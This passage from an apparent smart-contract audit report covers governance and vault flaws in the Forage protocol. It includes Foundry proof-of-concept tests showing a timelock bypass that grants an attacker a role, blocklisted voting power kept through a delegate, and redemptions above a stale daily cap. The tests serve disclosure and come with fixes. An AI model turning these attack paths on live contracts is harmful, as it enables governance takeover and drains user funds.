        _setTimelockDelayViaGovernance(PRODUCTION_TIMELOCK_DELAY);

        bytes32 nestedSalt = keccak256("nested_grant_canceller");
        (address[] memory targets, uint256[] memory values, bytes[] memory calldatas, bytes32 nestedOpId) =
            _buildOuterBypassGrantCanceller(attacker, nestedSalt);

        string memory description = "POC: direct timelock execution bypasses execute-time guards";
        bytes32 descriptionHash = keccak256(bytes(description));
        {
            uint256 proposalId = _createProposalWithParams(targets, values, calldatas, description);
            _passProposal(proposalId);
            governor.queue(targets, values, calldatas, descriptionHash);
        }
        vm.warp(block.timestamp + PRODUCTION_TIMELOCK_DELAY + 1);

        vm.expectRevert(
            abi.encodeWithSelector(ForageGovernor.TimelockDelayBelowMinimum.selector, 0, governor.MIN_TIMELOCK_DELAY())
        );
        governor.execute(targets, values, calldatas, descriptionHash);

        bytes32 timelockSalt = _timelockSalt(descriptionHash);
        bytes32 outerOpId = timelock.hashOperationBatch(targets, values, calldatas, bytes32(0), timelockSalt);
        assertEq(
            uint256(timelock.getOperationState(outerOpId)),
            uint256(TimelockController.OperationState.Ready),
            "queued proposal should still be directly executable through the timelock"
        );

        vm.prank(attacker);
        timelock.executeBatch(targets, values, calldatas, bytes32(0), timelockSalt);

        assertTrue(timelock.hasRole(keccak256("PROPOSER_ROLE"), address(timelock)), "timelock self-grants proposer role");
        assertEq(timelock.getMinDelay(), 0, "timelock delay is zeroed inside the outer batch");
        assertTrue(timelock.hasRole(keccak256("CANCELLER_ROLE"), attacker), "nested batch executes immediately");
        assertEq(
            uint256(timelock.getOperationState(nestedOpId)),
            uint256(TimelockController.OperationState.Done),
            "nested operation is scheduled and executed in the same transaction"
        );
    }

    function test_poc_cannotSwapNestedPayloadAfterVote() public {
        _setTimelockDelayViaGovernance(PRODUCTION_TIMELOCK_DELAY);

        bytes32 nestedSalt = keccak256("nested_grant_canceller");
        (address[] memory votedTargets, uint256[] memory votedValues, bytes[] memory votedCalldatas,) =
            _buildOuterBypassGrantCanceller(attacker, nestedSalt);

        string memory description = "POC: voted nested payload is fixed by proposal hash";
        bytes32 descriptionHash = keccak256(bytes(description));
        {
            uint256 proposalId = _createProposalWithParams(votedTargets, votedValues, votedCalldatas, description);
            _passProposal(proposalId);
            governor.queue(votedTargets, votedValues, votedCalldatas, descriptionHash);
        }
        vm.warp(block.timestamp + PRODUCTION_TIMELOCK_DELAY + 1);

        (address[] memory mutatedTargets, uint256[] memory mutatedValues, bytes[] memory mutatedCalldatas,) =
            _buildOuterBypassGrantCanceller(voter3, nestedSalt);

        bytes32 timelockSalt = _timelockSalt(descriptionHash);
        bytes32 votedOpId = timelock.hashOperationBatch(votedTargets, votedValues, votedCalldatas, bytes32(0), timelockSalt);
        bytes32 mutatedOpId =
            timelock.hashOperationBatch(mutatedTargets, mutatedValues, mutatedCalldatas, bytes32(0), timelockSalt);

        assertEq(uint256(timelock.getOperationState(votedOpId)), uint256(TimelockController.OperationState.Ready));
        assertEq(uint256(timelock.getOperationState(mutatedOpId)), uint256(TimelockController.OperationState.Unset));

        vm.prank(attacker);
        vm.expectRevert(
            abi.encodeWithSelector(
                TimelockController.TimelockUnexpectedOperationState.selector,
                mutatedOpId,
                bytes32(uint256(1 << uint8(TimelockController.OperationState.Ready)))
            )
        );
        timelock.executeBatch(mutatedTargets, mutatedValues, mutatedCalldatas, bytes32(0), timelockSalt);

        assertFalse(timelock.hasRole(keccak256("CANCELLER_ROLE"), voter3), "mutated nested payload was never approved");
    }

    function _buildNestedGrantCancellerBatch()
        internal
        view
        returns (
            address[] memory nestedTargets,
            uint256[] memory nestedValues,
            bytes[] memory nestedPayloads,
            bytes32 nestedOpId
        )
    {
        return _buildNestedGrantCancellerBatch(attacker, keccak256("nested_grant_canceller"));
    }

    function _buildNestedGrantCancellerBatch(address grantee, bytes32 nestedSalt)
        internal
        view
        returns (
            address[] memory nestedTargets,
            uint256[] memory nestedValues,
            bytes[] memory nestedPayloads,
            bytes32 nestedOpId
        )
    {
        nestedTargets = new address[](1);
        nestedTargets[0] = address(timelock);

        nestedValues = new uint256[](1);
        nestedPayloads = new bytes[](1);
        nestedPayloads[0] = abi.encodeCall(timelock.grantRole, (keccak256("CANCELLER_ROLE"), grantee));
        nestedOpId = timelock.hashOperationBatch(nestedTargets, nestedValues, nestedPayloads, bytes32(0), nestedSalt);
    }

    function _buildOuterBypassGrantCanceller(address grantee, bytes32 nestedSalt)
        internal
        view
        returns (
            address[] memory targets,
            uint256[] memory values,
            bytes[] memory calldatas,
            bytes32 nestedOpId
        )
    {
        (address[] memory nestedTargets, uint256[] memory nestedValues, bytes[] memory nestedPayloads, bytes32 opId) =
            _buildNestedGrantCancellerBatch(grantee, nestedSalt);
        (targets, values, calldatas) = _buildOuterBypassBatch(nestedTargets, nestedValues, nestedPayloads, nestedSalt);
        nestedOpId = opId;
    }

    function _buildOuterBypassBatch(
        address[] memory nestedTargets,
        uint256[] memory nestedValues,
        bytes[] memory nestedPayloads,
        bytes32 nestedSalt
    )
        internal
        view
        returns (address[] memory targets, uint256[] memory values, bytes[] memory calldatas)
    {
        targets = new address[](4);
        targets[0] = address(timelock);
        targets[1] = address(timelock);
        targets[2] = address(timelock);
        targets[3] = address(timelock);

        values = new uint256[](4);
        calldatas = new bytes[](4);
        calldatas[0] = abi.encodeCall(timelock.grantRole, (keccak256("PROPOSER_ROLE"), address(timelock)));
        calldatas[1] = abi.encodeCall(timelock.updateDelay, (0));
        calldatas[2] =
            abi.encodeCall(timelock.scheduleBatch, (nestedTargets, nestedValues, nestedPayloads, bytes32(0), nestedSalt, 0));
        calldatas[3] =
            abi.encodeCall(timelock.executeBatch, (nestedTargets, nestedValues, nestedPayloads, bytes32(0), nestedSalt));
    }

    function _timelockSalt(bytes32 descriptionHash) internal view returns (bytes32) {
        return bytes32(bytes20(address(governor))) ^ descriptionHash;
    }

    function _setTimelockDelayViaGovernance(uint256 newDelay) internal {
        address[] memory targets = new address[](1);
        targets[0] = address(timelock);

        uint256[] memory values = new uint256[](1);
        bytes[] memory calldatas = new bytes[](1);
        calldatas[0] = abi.encodeCall(timelock.updateDelay, (newDelay));

        string memory description = "Setup: raise timelock delay";
        bytes32 descriptionHash = keccak256(bytes(description));

        uint256 proposalId = _createProposalWithParams(targets, values, calldatas, description);
        _passProposal(proposalId);

        governor.queue(targets, values, calldatas, descriptionHash);
        vm.warp(block.timestamp + TIMELOCK_MIN_DELAY + 1);
        governor.execute(targets, values, calldatas, descriptionHash);
    }
}

```

#### Recommendation

Primary fix: eliminate the direct timelock execution path for governance-owned operations, or replicate the governor's timelock invariants inside the timelock itself.

In addition, add an invariant that forbids governor-managed timelocks from executing any batch that both:
- mutates timelock roles / delay, and
- schedules or executes additional timelock operations in the same outer execution.

A defense-in-depth improvement is to dedicate a custom timelock implementation to governor-managed proposals and reject re-entrant self-scheduling during `execute()` / `executeBatch()`.

#### Assumptions

- [x] The deployed timelock still exposes an open executor path for direct `timelock.executeBatch(...)` calls.
- [x] The voted outer proposal already encodes the nested `scheduleBatch(...)` / `executeBatch(...)` calldata.
- [x] The bypass is triggered by executing the queued proposal directly on the timelock instead of through `governor.execute(...)`.

#### Predicted Invalid Reasons

- "The nested payload is already encoded in the proposal calldata, so governance approved it; there is no hidden arbitrary second payload here."

<a id="finding-open-90"></a>
### OPEN-90 — Rotating the guardian module permanently severs guardian emergency control over HLTradingBridge

#### Summary

`HLTradingBridge` stores `guardianModule` once during `initialize()` and never re-derives it, while `ForageGovernor.setGuardianModule()` can rotate the active guardian module. After a legitimate rotation, the old module self-disables and the new module is rejected by the bridge, so guardian pause, freeze, and cap-tighten controls on the custody bridge are lost until the bridge itself is upgraded or rewired.

#### Context Files

##### HLTradingBridge.initialize

Path: `openforage_audit_repo/openforage_smart_contracts/src/hyperliquid/HLTradingBridge.sol`
Highlight lines: 1

```solidity
function initialize(..., address guardianModule_, RouteConfig calldata route) external initializer {
    ...
    guardianModule = guardianModule_;
    ...
}
```

##### HLTradingBridge.guardianAuth

Path: `openforage_audit_repo/openforage_smart_contracts/src/hyperliquid/HLTradingBridge.sol`
Highlight lines: 1

```solidity
function setDirectionalFreeze(bool frozen) external {
    _requireGuardianModuleOrOwner();
    if (msg.sender == guardianModule && !frozen) revert GuardianCannotLoosen();
    _setDirectionalFreeze(frozen);
}

function freezeAttestations() external {
    _requireGuardianModuleOrOwner();
    _setDirectionalFreeze(true);
}

function pause() external {
    if (msg.sender != guardianModule && msg.sender != owner()) revert UnauthorizedPause();
    _pause();
}

function _requireGuardianModuleOrOwner() internal view {
    if (msg.sender != guardianModule && msg.sender != owner()) revert UnauthorizedPause();
}
```

##### HLTradingBridge._authorizeUpgrade

Path: `openforage_audit_repo/openforage_smart_contracts/src/hyperliquid/HLTradingBridge.sol`
Highlight lines: 1

```solidity
function _authorizeUpgrade(address) internal override onlyOwner {}
```

##### ForageGovernor.setGuardianModule

Path: `openforage_audit_repo/openforage_smart_contracts/src/ForageGovernor.sol`
Highlight lines: 1

```solidity
function setGuardianModule(address guardianModule_) external {
    if (msg.sender != _executor()) revert Unauthorized();
    _validateGuardianModule(guardianModule_);
    guardianModule = GuardianModule(guardianModule_);
}
```

##### GuardianModule._requireCurrentGuardianModule

Path: `openforage_audit_repo/openforage_smart_contracts/src/GuardianModule.sol`
Highlight lines: 1

```solidity
function _requireCurrentGuardianModule() internal view {
    (bool ok, bytes memory data) = governor.staticcall(abi.encodeWithSignature("guardianModule()"));
    if (!ok || data.length < 32 || abi.decode(data, (address)) != address(this)) revert Unauthorized();
}
```

#### Proof of Concept

Add `test/hyperliquid/POC_HLTradingBridge_guardianRotation_ef0281c7.t.sol`, run `forge test --match-path test/hyperliquid/POC_HLTradingBridge_guardianRotation_ef0281c7.t.sol -vvv`, and confirm: the original guardian module can pause `HLTradingBridge` before rotation; after `ForageGovernor.setGuardianModule(newModule)`, the old module reverts with `GuardianModule.Unauthorized`; the new module reverts with `HLTradingBridge.UnauthorizedPause`; and `guardianExecuteEmergency([bridge], [0], [freezeAttestations()])` leaves `directionalFreeze == false`.

##### POC_HLTradingBridge_GuardianRotation_ef0281c7.t.sol

Path: `test/hyperliquid/POC_HLTradingBridge_guardianRotation_ef0281c7.t.sol`

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import "@openzeppelin/contracts/governance/TimelockController.sol";

import "../../src/ForageGovernor.sol";
import "../../src/GuardianModule.sol";
import "../../src/hyperliquid/HLTradingBridge.sol";
import "../mocks/MockForageTokenVotes.sol";
import "../mocks/MockUSDC.sol";

/**
 * @title POC: Guardian-Module Rotation Orphans HLTradingBridge Emergency Control
 * @notice Proof Statement: Proves that once `ForageGovernor.setGuardianModule()` points to a new
 * module, the old module can no longer invoke guardian emergency paths and the new module cannot
 * pause or freeze `HLTradingBridge` because the bridge still authorizes only the original module
 * address stored during `initialize()`. The only remaining live pause path is the owner timelock.
 */
contract POC_HLTradingBridge_GuardianRotation_ef0281c7 is Test {
    uint256 internal constant PAUSE_AND_EMERGENCY = (1 << 0) | (1 << 2);
    uint48 internal constant VOTING_DELAY = 0;
    uint32 internal constant VOTING_PERIOD = 3_600;
    uint256 internal constant PROPOSAL_THRESHOLD_BPS = 100;
    uint256 internal constant QUORUM_BPS = 400;

    MockForageTokenVotes internal token;
    MockUSDC internal usdc;
    TimelockController internal timelock;
    ForageGovernor internal governor;
    GuardianModule internal oldModule;
    GuardianModule internal newModule;
    HLTradingBridge internal bridge;

    address internal guardian = makeAddr("guardian");
    address internal keeper = makeAddr("keeper");
    address internal executor = makeAddr("executor");
    address internal riskusdVault = makeAddr("riskusd-vault");
    address internal usdcTreasury = makeAddr("usdc-treasury");
    address internal custodianRegistry = makeAddr("custodian-registry");
    address internal coldAccount = makeAddr("cold-account");
    bytes32 internal sourceAccount = bytes32(uint256(uint160(makeAddr("source-account"))));

    function setUp() public {
        token = new MockForageTokenVotes();
        usdc = new MockUSDC();

        address[] memory proposers = new address[](1);
        proposers[0] = address(this);
        address[] memory executors = new address[](1);
        executors[0] = address(this);
        timelock = new TimelockController(0, proposers, executors, address(this));

        ForageGovernor governorImplementation = new ForageGovernor();
        bytes memory governorInit = abi.encodeCall(
            ForageGovernor.initialize,
            (
                address(token),
                address(timelock),
                VOTING_DELAY,
                VOTING_PERIOD,
                PROPOSAL_THRESHOLD_BPS,
                QUORUM_BPS,
                address(0)
            )
        );
        governor = ForageGovernor(payable(address(new ERC1967Proxy(address(governorImplementation), governorInit))));

        oldModule = _deployModule(address(governor), address(timelock), guardian);
        vm.prank(address(timelock));
        governor.setGuardianModule(address(oldModule));

        bridge = _deployBridge(address(oldModule), address(timelock));

        vm.prank(address(timelock));
        oldModule.setPausableTarget(address(bridge), true);
    }

    function test_rotationSeversGuardianPauseAndFreezeControl() public {
        vm.prank(guardian);
        oldModule.guardianPause(address(bridge));
        assertTrue(bridge.paused(), "old guardian module must pause bridge before rotation");

        vm.prank(address(timelock));
        bridge.unpause();
        assertFalse(bridge.paused(), "owner timelock must unpause bridge");

        newModule = _deployModule(address(governor), address(timelock), guardian);

        vm.prank(address(timelock));
        newModule.setPausableTarget(address(bridge), true);

        vm.prank(address(timelock));
        governor.setGuardianModule(address(newModule));

        vm.prank(guardian);
        vm.expectRevert(GuardianModule.Unauthorized.selector);
        oldModule.guardianPause(address(bridge));

        vm.prank(guardian);
        vm.expectRevert(HLTradingBridge.UnauthorizedPause.selector);
        newModule.guardianPause(address(bridge));

        address[] memory targets = new address[](1);
        targets[0] = address(bridge);
        uint256[] memory values = new uint256[](1);
        bytes[] memory calldatas = new bytes[](1);
        calldatas[0] = abi.encodeWithSignature("freezeAttestations()");

        vm.prank(guardian);
        newModule.guardianExecuteEmergency(targets, values, calldatas);

        assertFalse(bridge.directionalFreeze(), "new guardian module must fail to freeze bridge after rotation");

        vm.prank(address(timelock));
        bridge.pause();
        assertTrue(bridge.paused(), "timelock owner remains the only working bridge pause path");
    }

    function _deployModule(address governor_, address timelock_, address guardian_) internal returns (GuardianModule) {
        address[] memory guardians = new address[](1);
        guardians[0] = guardian_;
        uint256[] memory permissions = new uint256[](1);
        permissions[0] = PAUSE_AND_EMERGENCY;

        GuardianModule implementation = new GuardianModule();
        bytes memory initData =
            abi.encodeCall(GuardianModule.initialize, (governor_, timelock_, guardians, permissions));
        return GuardianModule(address(new ERC1967Proxy(address(implementation), initData)));
    }

    function _deployBridge(address guardianModule_, address owner_) internal returns (HLTradingBridge) {
        HLTradingBridge implementation = new HLTradingBridge();
        bytes memory initData = abi.encodeCall(
            HLTradingBridge.initialize,
            (
                address(usdc),
                riskusdVault,
                usdcTreasury,
                custodianRegistry,
                owner_,
                keeper,
                executor,
                guardianModule_,
                HLTradingBridge.RouteConfig({
                    coldAccount: coldAccount,
                    hyperliquidSourceAccount: sourceAccount,
                    withdrawalChainSelector: uint64(421_614)
                })
            )
        );
        return HLTradingBridge(address(new ERC1967Proxy(address(implementation), initData)));
    }
}
```

#### Recommendation

Make bridge guardian authorization follow the current governor-controlled module instead of a one-time snapshot.

Primary fix:

```solidity
function _requireGuardianModuleOrOwner() internal view {
    if (msg.sender == owner()) return;
    address currentGovernorModule = IForageGovernorPause(governor).guardianModule();
    if (msg.sender != currentGovernorModule) revert UnauthorizedPause();
}
```

Alternative fixes:
- Add a delayed bridge `proposeGuardianModule/finalizeGuardianModule` flow and require it to match the governor before the governor’s own module rotation finalizes.
- Add a bridge reinitializer/setter that is executed atomically with guardian-module rotation proposals.

#### Assumptions

- [x] Governance will eventually use the supported `ForageGovernor.setGuardianModule()` path.
- [x] The bridge is not simultaneously upgraded or replaced to rewrite `guardianModule`.
- [x] The protocol expects guardian emergency controls to remain available after module rotation.

#### Predicted Invalid Reasons

- `HLTradingBridge` can still be paused by the timelock owner, so this is only an operational inconvenience.

<a id="finding-open-89"></a>
### OPEN-89 — Blocklisted FORAGE holders keep full governance power through pre-arranged unblocked delegates

#### Summary

`ERC20Votes` delegations are not unwound when a holder is blocklisted. If the holder delegated to an unblocked helper before sanctions, the helper keeps the checkpointed voting power and can still propose or vote because `ForageGovernor` checks only the direct caller.

#### Context Files

##### ForageToken.delegate()

Path: `src/ForageToken.sol`
Highlight lines: 1

```solidity
function delegate(address delegatee) public override {
    address account = _msgSender();
    _requireNotBlocked(account);
    if (delegatee != address(0)) {
        _requireNotBlocked(delegatee);
    }
    super.delegate(delegatee);
}
```

##### ForageToken._update()

Path: `src/ForageToken.sol`
Highlight lines: 1

```solidity
function _update(address from, address to, uint256 value)
    internal
    override(ERC20Upgradeable, ERC20VotesUpgradeable)
{
    if (from != address(0)) {
        _requireNotBlocked(from);
    }
    if (to != address(0)) {
        _requireNotBlocked(to);
    }
    super._update(from, to, value);
}
```

##### ForageGovernor.propose() threshold check

Path: `src/ForageGovernor.sol`
Highlight lines: 1

```solidity
address proposerAddr = _msgSender();
_requireNotBlocked(proposerAddr);
uint256 proposerVotes = getVotes(proposerAddr, clock() - 1);
if (threshold > 0 && proposerVotes < threshold) {
    revert InsufficientVotingPower();
}
```

##### ForageGovernor._castVote() blocklist check

Path: `src/ForageGovernor.sol`
Highlight lines: 1

```solidity
function _castVote(uint256 proposalId, address account, uint8 support, string memory reason, bytes memory params)
    internal
    override(GovernorUpgradeable)
    returns (uint256)
{
    _requireNotBlocked(account);
    uint256 weight = super._castVote(proposalId, account, support, reason, params);
    ...
    return weight;
}
```

#### Proof of Concept

- Save the test as `test/audit/cantina_scan4/POC_ForageGovernorBlocklistDelegation_5f27bc60.t.sol`.
- Run `forge test --match-path test/audit/cantina_scan4/POC_ForageGovernorBlocklistDelegation_5f27bc60.t.sol -vv`.
- The test delegates `20_000_000 * 1e18` to a clean helper, blocklists the holder, and shows the helper still proposes and votes with the full delegated balance, reaching quorum.

##### POC_ForageGovernorBlocklistDelegation_5f27bc60.t.sol

Path: `test/audit/cantina_scan4/POC_ForageGovernorBlocklistDelegation_5f27bc60.t.sol`

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";

import {Blocklist} from "../../../src/Blocklist.sol";
import {ForageGovernor} from "../../../src/ForageGovernor.sol";
import {ForageToken} from "../../../src/ForageToken.sol";
import {CantinaScan4RealGovernanceTestBase} from "./CantinaScan4RealGovernanceTestBase.sol";

/**
 * @title POC: Blocklisted FORAGE holder keeps governance power through a clean delegate
 * @notice Proof Statement: Proves that once a FORAGE holder delegates votes to an unblocked helper,
 * blocklisting the holder does not remove the delegated checkpoints. The blocked holder can no longer
 * transfer or change delegation, but the clean helper can still satisfy `proposalThreshold()` and cast
 * a quorum-reaching vote with the blocked holder's delegated balance.
 */
contract POC_ForageGovernorBlocklistDelegation_5f27bc60 is CantinaScan4RealGovernanceTestBase {
    Blocklist public blocklistRegistry;

    function setUp() public override {
        super.setUp();

        Blocklist impl = new Blocklist();
        bytes memory initData = abi.encodeCall(Blocklist.initialize, (guardian1, deployer));
        blocklistRegistry = Blocklist(address(new ERC1967Proxy(address(impl), initData)));

        vm.prank(deployer);
        token.setBlocklist(address(blocklistRegistry));
    }

    function test_blocklistedDelegatorKeepsProposalAndVotingPowerThroughCleanDelegate() public {
        uint256 delegatedBalance = 20_000_000 * 1e18;

        assertEq(token.balanceOf(proposer), delegatedBalance, "proposer should hold the vesting allocation");
        assertEq(governor.proposalThreshold(), 1_000_000 * 1e18, "threshold should be 1% of supply");
        assertEq(token.getVotes(attacker), 0, "helper starts without voting power");

        vm.prank(proposer);
        token.delegate(attacker);

        vm.warp(block.timestamp + 1);
        vm.roll(block.number + 1);

        assertEq(token.delegates(proposer), attacker, "delegation should point at helper");
        assertEq(token.getVotes(attacker), delegatedBalance, "helper should hold delegated voting power");

        vm.prank(guardian1);
        blocklistRegistry.blockAddress(proposer);
        assertTrue(blocklistRegistry.isBlocked(proposer), "proposer should now be blocklisted");

        vm.prank(proposer);
        vm.expectRevert(abi.encodeWithSelector(ForageToken.BlockedAddress.selector, proposer));
        token.transfer(attacker, 1);

        vm.prank(proposer);
        vm.expectRevert(abi.encodeWithSelector(ForageToken.BlockedAddress.selector, proposer));
        token.delegate(address(0));

        (address[] memory targets, uint256[] memory values, bytes[] memory calldatas) = _standardProposal();

        vm.prank(proposer);
        vm.expectRevert(abi.encodeWithSelector(ForageGovernor.BlockedAddress.selector, proposer));
        governor.propose(targets, values, calldatas, "blocked-holder-cannot-propose-directly");

        vm.prank(attacker);
        uint256 proposalId = governor.propose(targets, values, calldatas, "clean-delegate-keeps-blocked-votes");
        assertEq(governor.proposalProposer(proposalId), attacker, "helper should become the proposer");

        vm.warp(block.timestamp + governor.votingDelay() + 1);
        vm.roll(block.number + 1);

        vm.prank(proposer);
        vm.expectRevert(abi.encodeWithSelector(ForageGovernor.BlockedAddress.selector, proposer));
        governor.castVote(proposalId, 1);

        vm.prank(attacker);
        uint256 weight = governor.castVote(proposalId, 1);
        assertEq(weight, delegatedBalance, "helper should vote with the blocked holder's full balance");
        assertEq(governor.quorumForProposal(proposalId), 4_000_000 * 1e18, "quorum should remain 4% of supply");
        assertTrue(weight >= governor.quorumForProposal(proposalId), "single delegated whale should clear quorum");
        assertTrue(governor.hasVoted(proposalId, attacker), "helper vote should be recorded");
    }

    function _standardProposal()
        internal
        view
        returns (address[] memory targets, uint256[] memory values, bytes[] memory calldatas)
    {
        targets = new address[](1);
        values = new uint256[](1);
        calldatas = new bytes[](1);

        targets[0] = address(governor);
        calldatas[0] = abi.encodeCall(ForageGovernor.setMaxActiveProposals, (DEFAULT_MAX_ACTIVE));
    }
}

```

#### Recommendation

Blocklist actions must be able to neutralize governance power already delegated from blocked balances.

Primary fix:
- Add a governance-side voting filter that discounts votes sourced from blocklisted holders, or
- add a token-side hook / admin path that forces blocked balances to delegate to `address(0)` and updates checkpoints when an account is blocked.

Alternative fixes:
- Maintain a governor-level denylist of blocked voting sources and refuse proposal/vote power derived from them.
- If retroactive checkpoint surgery is undesirable, explicitly document that the protocol must block both the holder and every active delegate address, then expose tooling/automation that enforces that invariant.

#### Assumptions

- [x] The holder delegated before the blocklist action.
- [x] The helper delegate remains unblocked when proposing and voting.
- [x] The delegated balance is large enough to meet the relevant proposal threshold and quorum.

#### Predicted Invalid Reasons

- The blocked holder cannot call `delegate()` anymore, so the blocklist already works as intended.
- If a proxy delegate is abusive, we can block the proxy too.

<a id="finding-open-100"></a>
### OPEN-100 — Daily redemption cap can be permanently poisoned by an obsolete high-supply snapshot

#### Summary

The daily redemption cap in `RISKUSDVault` can get stuck on a stale high-supply snapshot. Once `_dailyRedemptionWindowStartSupply` is set, later redemptions and `burnForLoss()` do not lower it, and day rollover keeps `max(oldSnapshot, currentSupply)`, so future 24-hour caps can remain higher than the live-supply limit after a contraction. This weakens the intended pacing control, though redemptions still burn 1:1 and the weekly cap still bounds total outflow.

#### Context Files

##### effectiveDailyRedemptionCap

Path: `src/RISKUSDVault.sol`
Highlight lines: 1

```solidity
function effectiveDailyRedemptionCap() public view returns (uint256) {
    uint256 effectiveSupply;
    if (block.timestamp >= _dailyRedemptionWindowStart + DAILY_WINDOW) {
        effectiveSupply = _dailyRedemptionWindowStartSupply > _riskusd.totalSupply()
            ? _dailyRedemptionWindowStartSupply
            : _riskusd.totalSupply();
    } else if (_dailyRedemptionWindowStartSupply == 0) {
        effectiveSupply = _riskusd.totalSupply();
    } else {
        effectiveSupply = _dailyRedemptionWindowStartSupply;
    }
    return effectiveSupply * _dailyRedemptionCapBps / 10000;
}
```

##### _enforceDailyRedemptionCap

Path: `src/RISKUSDVault.sol`
Highlight lines: 1

```solidity
function _enforceDailyRedemptionCap(uint256 riskusdAmount) internal {
    uint256 cachedTotalSupply = _riskusd.totalSupply();

    if (block.timestamp >= _dailyRedemptionWindowStart + DAILY_WINDOW) {
        _dailyRedemptionUsed = 0;
        uint256 elapsed = (block.timestamp - _dailyRedemptionWindowStart) / DAILY_WINDOW;
        _dailyRedemptionWindowStart += elapsed * DAILY_WINDOW;
        _dailyRedemptionWindowStartSupply = _dailyRedemptionWindowStartSupply > cachedTotalSupply
            ? _dailyRedemptionWindowStartSupply
            : cachedTotalSupply;
    } else if (_dailyRedemptionWindowStartSupply == 0) {
        _dailyRedemptionWindowStartSupply = cachedTotalSupply;
    }

    uint256 cap = _dailyRedemptionWindowStartSupply * _dailyRedemptionCapBps / 10000;
    if (_dailyRedemptionUsed + riskusdAmount > cap) revert DailyRedemptionCapExceeded();
}
```

##### redeem

Path: `src/RISKUSDVault.sol`
Highlight lines: 1

```solidity
function redeem(uint256 riskusdAmount) external whenNotPaused nonReentrant {
    _enforceWeeklyCap(riskusdAmount);
    _enforceDailyRedemptionCap(riskusdAmount);
    ...
    _riskusd.burn(address(this), riskusdAmount);
    _reduceMintActiveSupply(riskusdAmount);
    _usdc.safeTransfer(msg.sender, riskusdAmount);
}
```

##### burnForLoss adjustments

Path: `src/RISKUSDVault.sol`
Highlight lines: 1

```solidity
if (block.timestamp < _weeklyRedemptionWindowStart + WEEKLY_WINDOW && _windowStartSupply > 0) {
    _windowStartSupply = _windowStartSupply >= riskusdAmount ? _windowStartSupply - riskusdAmount : 0;
}
if (_lastActiveSupply > riskusdAmount) {
    _lastActiveSupply -= riskusdAmount;
} else {
    _lastActiveSupply = 0;
}
_reduceMintActiveSupply(riskusdAmount);
```

#### Proof of Concept

Run the Foundry test `test/POC_RISKUSDVault.rollingDailyRedeem_ad6d796e.t.sol`.

The POC deposits `100,000e6`, sets the daily cap to `200` bps, redeems until supply contracts below `20,000e6`, advances to a fresh week/day, and then shows that `effectiveDailyRedemptionCap()` still returns the stale `2,000e6` cap while `vault.redeem(liveSupplyCap + 1)` succeeds.

##### forge test command

Path: `shell`

```bash
timeout 300s forge test --match-path test/POC_RISKUSDVault.rollingDailyRedeem_ad6d796e.t.sol -vv
```

##### POC_RISKUSDVault_RollingDailyRedeem_ad6d796e

Path: `test/POC_RISKUSDVault.rollingDailyRedeem_ad6d796e.t.sol`

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "./helpers/RISKUSDVaultTestBase.sol";

contract POC_RISKUSDVault_RollingDailyRedeem_ad6d796e is RISKUSDVaultTestBase {
    uint256 internal constant INITIAL_SUPPLY = 100_000e6;
    uint256 internal constant TARGET_SUPPLY = 20_000e6;

    /**
     * @notice Proof Statement: Proves that once a 24-hour redemption window snapshots a higher RISKUSD supply, later redemptions never reduce `_dailyRedemptionWindowStartSupply`, so after supply contracts the vault still permits a fresh-window redemption above 2% of current supply under the shipped 5% weekly / 2% daily settings.
     */
    function setUp() public override {
        super.setUp();
        _deposit(alice, INITIAL_SUPPLY);

        vm.prank(owner);
        vault.setDailyRedemptionCapBps(200);
    }

    function test_POC_staleDailySnapshotAllowsRedeemAboveCurrentSupplyCap() public {
        _approveVaultRISKUSD(alice, type(uint256).max);

        for (uint256 weekCount = 0; weekCount < 40 && riskusd.totalSupply() > TARGET_SUPPLY; ++weekCount) {
            while (vault.weeklyRedemptionRemaining() > 0) {
                uint256 amount = _min(vault.weeklyRedemptionRemaining(), vault.dailyRedemptionRemaining());

                vm.prank(alice);
                vault.redeem(amount);

                if (vault.weeklyRedemptionRemaining() == 0) break;
                _advanceDays(1);
            }

            if (riskusd.totalSupply() <= TARGET_SUPPLY) break;
            _advanceToNextWeek();
        }

        assertLe(riskusd.totalSupply(), TARGET_SUPPLY, "setup must materially contract supply");

        _advanceToNextWeek();

        uint256 currentSupply = riskusd.totalSupply();
        uint256 liveSupplyCap = currentSupply * vault.dailyRedemptionCapBps() / 10000;
        uint256 staleCap = vault.effectiveDailyRedemptionCap();
        uint256 allowedNow = _min(vault.weeklyRedemptionRemaining(), vault.dailyRedemptionRemaining());

        assertEq(staleCap, INITIAL_SUPPLY * 200 / 10000, "daily cap still uses the obsolete first snapshot");
        assertLt(currentSupply, INITIAL_SUPPLY, "supply must be lower than the stale snapshot");
        assertGt(staleCap, liveSupplyCap, "stale snapshot must overstate the daily cap");
        assertGt(allowedNow, liveSupplyCap, "fresh window still permits more than 2% of live supply");

        vm.prank(alice);
        vault.redeem(liveSupplyCap + 1);

        assertEq(vault.dailyRedemptionUsed(), liveSupplyCap + 1, "redeem above live-supply daily cap succeeded");
    }

    function _advanceDays(uint256 daysForward) internal {
        vm.warp(block.timestamp + (daysForward * 1 days));
        vm.roll(block.number + 1);
    }

    function _advanceToNextWeek() internal {
        vm.warp(vault.weeklyRedemptionWindowStart() + 7 days + 1);
        vm.roll(block.number + 1);
    }

    function _min(uint256 a, uint256 b) internal pure returns (uint256) {
        return a < b ? a : b;
    }
}

```

#### Recommendation

Reset daily redemption windows from a live or conservative post-burn supply source, and update the daily snapshot when supply is destroyed.

A minimal fix is:

```solidity
if (block.timestamp >= _dailyRedemptionWindowStart + DAILY_WINDOW) {
    _dailyRedemptionUsed = 0;
    uint256 elapsed = (block.timestamp - _dailyRedemptionWindowStart) / DAILY_WINDOW;
    _dailyRedemptionWindowStart += elapsed * DAILY_WINDOW;
    _dailyRedemptionWindowStartSupply = cachedTotalSupply;
}
```

Additionally, mirror the weekly post-burn adjustment for the daily redemption snapshot whenever `redeem()` or `burnForLoss()` destroys supply during an active day window.

#### Assumptions

- [x] The daily redemption cap is intended to shrink after a material supply contraction rather than remain anchored to a historical high-water mark.
- [x] The weekly cap is a secondary bound and does not replace the intended 24-hour pacing rule.
- [x] The shipped default `dailyRedemptionCapBps = 200` is the relevant configuration.

#### Predicted Invalid Reasons

- The daily cap is intentionally based on start-of-window supply, and users still cannot redeem more than they own or more than the vault holds.
- Weekly pacing already limits aggregate exits.

<a id="finding-open-69"></a>
